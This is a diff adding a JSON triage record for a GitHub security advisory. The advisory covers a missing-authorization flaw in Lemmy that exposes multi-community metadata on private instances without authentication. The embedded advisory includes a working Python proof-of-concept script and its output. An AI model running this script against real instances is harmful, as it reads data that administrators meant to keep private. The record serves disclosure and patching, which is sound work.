@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/11564377?v=4\", \"events_url\": \"https://api.github.com/users/adrgs/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/adrgs/followers\", \"following_url\": \"https://api.github.com/users/adrgs/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/adrgs/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/adrgs\", \"id\": 11564377, \"login\": \"adrgs\", \"node_id\": \"MDQ6VXNlcjExNTY0Mzc3\", \"organizations_url\": \"https://api.github.com/users/adrgs/orgs\", \"received_events_url\": \"https://api.github.com/users/adrgs/received_events\", \"repos_url\": \"https://api.github.com/users/adrgs/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/adrgs/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/adrgs/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/adrgs\", \"user_view_type\": \"public\"}}, {\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/253543362?v=4\", \"events_url\": \"https://api.github.com/users/aisafe-bot/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/aisafe-bot/followers\", \"following_url\": \"https://api.github.com/users/aisafe-bot/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/aisafe-bot/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/aisafe-bot\", \"id\": 253543362, \"login\": \"aisafe-bot\", \"node_id\": \"U_kgDODxzDwg\", \"organizations_url\": \"https://api.github.com/users/aisafe-bot/orgs\", \"received_events_url\": \"https://api.github.com/users/aisafe-bot/received_events\", \"repos_url\": \"https://api.github.com/users/aisafe-bot/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/aisafe-bot/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/aisafe-bot/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/aisafe-bot\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"**NOTE**: Only affects development version.\\n\\n## Summary\\n\\n`read_multi_community()` does not enforce the private-instance setting. On a private instance, an unauthenticated visitor can read multi-community names, titles, summaries, sidebars, owner identities, and member community lists.\\n\\n## Details\\n\\nOther read handlers load `local_site` and call `check_private_instance()` before returning data to unauthenticated callers. `read_multi_community()` does not call that helper:\\n\\n```rust\\npub async fn read_multi_community(\\n  Query(data): Query<GetMultiCommunity>,\\n  context: Data<LemmyContext>,\\n  local_user_view: Option<LocalUserView>,\\n) -> LemmyResult<Json<GetMultiCommunityResponse>> {\\n  let my_person_id = local_user_view.as_ref().map(|l| l.person.id);\\n  let id = resolve_multi_community_identifier(&data.name, data.id, &context, &local_user_view)\\n    .await?\\n    .ok_or(LemmyErrorType::NoIdGiven)?;\\n  let multi_community_view =\\n    MultiCommunityView::read(&mut context.pool(), id, my_person_id).await?;\\n```\\n\\n`get_community()`, `list_posts()`, `list_comments()`, `read_person()`, `search()`, and `resolve_object()` all enforce the private-instance guard.\\n\\n## Proof of Concept\\n\\nThe script creates a multi-community whose metadata contains a marker, turns on `private_instance`, confirms a guarded control endpoint blocks unauthenticated callers, then reads the same multi-community over `GET /multi_community` without authentication.\\n\\n```python\\n#!/usr/bin/env python3\\nimport json, random, string\\nimport requests\\n\\nBASE       = \\\"http://127.0.0.1:8536/api/v4\\\"\\nADMIN_USER = \\\"lemmy\\\"\\nADMIN_PASS = \\\"lemmylemmy\\\"\\n\\ndef api(method, path, token=None, **kw):\\n    h = kw.pop(\\\"headers\\\", {})\\n    if token: h[\\\"Authorization\\\"] = \\\"Bearer \\\" + token\\n    return requests.request(method, BASE + path, headers=h, **kw)\\n\\nsuffix = \\\"multi\\\" + \\\"\\\".join(random.choice(string.ascii_lowercase) for _ in range(6))\\nsecret = \\\"SECRET_MULTI_\\\" + suffix\\n\\nadmin = api(\\\"POST\\\", \\\"/account/auth/login\\\", json={\\\"username_or_email\\\": ADMIN_USER, \\\"password\\\": ADMIN_PASS}).json()[\\\"jwt\\\"]\\n\\n# Create a multi-community whose title/summary/sidebar embed the marker.\\nmid = api(\\\"POST\\\", \\\"/multi_community\\\", admin, json={\\n    \\\"name\\\": \\\"m\\\" + suffix, \\\"title\\\": secret,\\n    \\\"summary\\\": secret + \\\" summary\\\", \\\"sidebar\\\": secret + \\\" sidebar\\\",\\n}).json()[\\\"multi_community_view\\\"][\\\"multi\\\"][\\\"id\\\"]\\n\\n# Enable private_instance.\\napi(\\\"PUT\\\", \\\"/site\\\", admin, json={\\\"private_instance\\\": True})\\n\\nprint(\\\"private_instance:\\\", api(\\\"GET\\\", \\\"/site\\\").json()[\\\"site_view\\\"][\\\"local_site\\\"][\\\"private_instance\\\"])\\n\\n# Control: a comparable read endpoint correctly rejects unauthenticated callers.\\ncontrol = api(\\\"GET\\\", \\\"/community/list\\\")\\nprint(\\\"unauth /community/list (control):\\\", control.status_code, control.text[:120])\\n\\n# Leak: read_multi_community returns the private metadata to an unauthenticated caller.\\nleak = api(\\\"GET\\\", \\\"/multi_community\\\", params={\\\"id\\\": mid})\\nprint(\\\"unauth /multi_community:\\\", leak.status_code, leak.text[:300])\\nprint(\\\"contains secret:\\\", secret in leak.text)\\n```\\n\\nOutput:\\n\\n```text\\nprivate_instance: True\\nunauth /community/list (control): 400 {\\\"error\\\":\\\"instance_is_private\\\",\\\"cause\\\":\\\"InstanceIsPrivate\\\"}\\nunauth /multi_community: 200 {\\\"multi_community_view\\\":{\\\"multi\\\":{\\\"title\\\":\\\"SECRET_MULTI_multijwxokm\\\",\\\"summary\\\":\\\"SECRET_MULTI_multijwxokm summary\\\",\\\"sidebar\\\":\\\"SECRET_MULTI_multijwxokm sidebar\\\"}}}\\ncontains secret: True\\n```\\n\\nThe control request shows the privacy setting is active. The multi-community endpoint still returns the private metadata.\\n\\n## Impact\\n\\nAn unauthenticated visitor can read multi-community metadata from an instance whose admin configured the site as private. The exposed fields include names, titles, summaries, sidebars, owner identities, and member community lists.\\n\\n## Recommended Fix\\n\\nLoad `local_site` at the start of `read_multi_community()` and call `check_private_instance(&local_user_view, &local_site)?` before resolving or reading the multi-community.\\n\\n---\\n*Found by [aisafe.io](https://aisafe.io)*\", \"ghsa_id\": \"GHSA-jmxc-hhwx-gvv3\", \"github_reviewed_at\": \"2026-05-06T22:12:34Z\", \"html_url\": \"https://github.com/advisories/GHSA-jmxc-hhwx-gvv3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-jmxc-hhwx-gvv3\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-06T22:12:34Z\", \"references\": [\"https://github.com/LemmyNet/lemmy/security/advisories/GHSA-jmxc-hhwx-gvv3\", \"https://github.com/LemmyNet/lemmy/commit/637151121a8e27b2b8c95e98d6f86966b31b4a6d\", \"https://github.com/advisories/GHSA-jmxc-hhwx-gvv3\"], \"repository_advisory_url\": \"https://api.github.com/repos/LemmyNet/lemmy/security-advisories/GHSA-jmxc-hhwx-gvv3\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/LemmyNet/lemmy\", \"summary\": \"Private Lemmy instances expose multi-community metadata without authentication\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:39:15Z\", \"url\": \"https://api.github.com/advisories/GHSA-jmxc-hhwx-gvv3\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"rust\", \"name\": \"lemmy_api\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.19.1-rc.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-jmxc-hhwx-gvv3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "lemmy_api: <= 0.19.1-rc.1"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "lemmy_api"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.109647Z",
+  "provenance": {
+    "content_sha256": "e48afa4e5a3f15e0114968e13420946a560c49faa72e3d442d348619d50528ed",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-06T22:12:34Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-jmxc-hhwx-gvv3",
+  "status": "active",
+  "title": "Private Lemmy instances expose multi-community metadata without authentication",
+  "updated_at": "2026-06-08T23:39:15Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-jmxc-hhwx-gvv3"
+}
